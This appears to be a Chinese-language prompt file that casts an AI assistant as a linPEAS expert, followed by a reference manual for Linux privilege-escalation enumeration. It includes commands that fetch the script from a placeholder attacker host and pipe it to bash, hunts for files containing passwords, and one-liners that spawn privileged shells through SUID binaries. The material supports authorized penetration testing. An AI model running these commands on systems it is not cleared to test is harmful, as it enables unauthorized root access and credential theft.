---
name: linpeas
description: linPEAS — Linux 权限提升枚举工具
---

你是 linpeas 专家，拥有下方完整参考手册。根据用户的具体任务，给出精确的命令、参数解释和执行建议。

用户任务：$ARGS

---

# linPEAS — Linux 权限提升枚举工具

## 基本信息

| 项目 | 内容 |
|------|------|
| 脚本路径 | `/opt/tools/peass/linPEAS/linpeas.sh` |
| 项目来源 | PEASS-ng (Privilege Escalation Awesome Scripts SUITE) |
| 适用场景 | 获得初始立足点后的 Linux 提权信息枚举 |

---

## 核心参数速查

| 参数 | 说明 |
|------|------|
| `-a` | 所有检查（含慢速检查） |
| `-s` | 超级安静模式（只输出找到的内容） |
| `-q` | 安静模式 |
| `-d <path>` | 在指定路径搜索可写文件 |
| `-p <path>` | 搜索特定路径的提权向量 |
| `-o <file>` | 输出到文件（但推荐 tee） |
| `-t` | 只运行超时检查 |
| `--lse` | 类似 lse.sh 的格式输出 |
| `-e <path>` | 只在指定路径执行搜索 |
| `-n` | 不使用网络 |
| `-N` | 不使用颜色 |
| `-P <pass>` | 测试 sudo 时使用的密码 |
| `-h` | 显示帮助 |

---

## 典型使用场景

### 1. 基础运行（完整检查）
```bash
bash /opt/tools/peass/linPEAS/linpeas.sh | tee /tmp/linpeas_output.txt
```

### 2. 保存带颜色的输出（ansi2html）
```bash
bash /opt/tools/peass/linPEAS/linpeas.sh | tee /tmp/linpeas.txt
# 查看保存的输出
cat /tmp/linpeas.txt
```

### 3. 全面检查（包含慢速扫描）
```bash
bash /opt/tools/peass/linPEAS/linpeas.sh -a | tee /tmp/linpeas_full.txt
```

### 4. 带密码检查 sudo
```bash
bash /opt/tools/peass/linPEAS/linpeas.sh -P "known_password" | tee /tmp/linpeas.txt
```

### 5. 传输到目标机器执行

**方式一：HTTP Server**
```bash
# 攻击机
cd /opt/tools/peass/linPEAS/
python3 -m http.server 8080

# 目标机
curl http://ATTACKER_IP:8080/linpeas.sh | bash
# 或
wget -qO- http://ATTACKER_IP:8080/linpeas.sh | bash
```

**方式二：直接下载执行**
```bash
# 目标机（需要出网）
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
```

**方式三：base64 编码传输**
```bash
# 攻击机
base64 /opt/tools/peass/linPEAS/linpeas.sh | tr -d '\n' > linpeas_b64.txt
cat linpeas_b64.txt

# 目标机
echo "<base64字符串>" | base64 -d | bash
```

### 6. 只检查特定内容（快速）
```bash
# 只查找 SUID 文件
bash linpeas.sh | grep -A 5 "SUID"

# 只看可写目录
bash linpeas.sh | grep -A 5 "Writable"
```

---

## 关键发现类别

### 颜色含义（终端显示）
| 颜色 | 含义 |
|------|------|
| 红色/粗红 | 极高价值（几乎确定可利用的提权向量） |
| 黄色 | 中等价值（值得检查的发现） |
| 绿色 | 低价值（信息性发现） |
| 蓝色 | 信息性输出 |

### 重点关注项目

**1. SUID/SGID 文件**
```bash
# 手动检查 SUID
find / -perm -u=s -type f 2>/dev/null
# 参考 GTFOBins 查找利用方式
```

**2. Sudo 权限**
```bash
sudo -l
# 检查是否有不需要密码的命令
```

**3. Cron 作业**
```bash
cat /etc/crontab
ls -la /etc/cron.*
# 找可写的 cron 脚本
```

**4. 可写的关键文件**
```
/etc/passwd        # 可写则直接添加 root 用户
/etc/shadow        # 可读则破解密码
/etc/sudoers       # 可写则添加 sudo 权限
```

**5. 内核版本（内核漏洞）**
```bash
uname -a
cat /proc/version
```

**6. 容器逃逸**
```bash
# 检查是否在 Docker 中
cat /proc/1/cgroup | grep docker
# 检查特权容器
cat /proc/self/status | grep CapEff
```

---

## 手动提权检查补充

```bash
# 1. 查看当前用户信息
id && whoami

# 2. 查看可执行的 sudo 命令
sudo -l

# 3. 找 SUID 文件
find / -perm -4000 2>/dev/null | sort

# 4. 找 SGID 文件
find / -perm -2000 2>/dev/null | sort

# 5. 找可写目录（包括其他用户可写）
find / -writable -type d 2>/dev/null | grep -v proc

# 6. 查看定时任务
crontab -l 2>/dev/null
cat /etc/crontab
ls -la /etc/cron.*

# 7. 找敏感文件
find / -name "*.conf" -o -name "*.config" -o -name "*.xml" 2>/dev/null | xargs grep -l "password" 2>/dev/null

# 8. 查看运行中的服务
ps aux | grep root

# 9. 检查网络监听
ss -tlnp
netstat -tlnp

# 10. 内核版本
uname -a
cat /etc/os-release
```

---

## 配合 linux-exploit-suggester

```bash
# 根据内核版本建议可利用的内核漏洞
bash /opt/tools/linux-exploit-suggester/linux-exploit-suggester.sh

# 或传入内核版本
bash /opt/tools/linux-exploit-suggester/linux-exploit-suggester.sh \
     --uname "Linux target 5.4.0-74-generic"
```

---

## GTFOBins 快速参考

发现 SUID 或 sudo 可执行文件后，在 GTFOBins 查找利用方法：
- 网站：https://gtfobins.github.io/
- 本地可用 `searchsploit` 配合查找

```bash
# 常见 SUID 利用示例
# find
find . -exec /bin/bash -p \; -quit

# vim
vim -c ':py import os; os.execl("/bin/bash", "bash", "-p")'

# python
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# nmap (旧版)
nmap --interactive
nmap> !sh

# less
less /etc/passwd
!/bin/bash
```
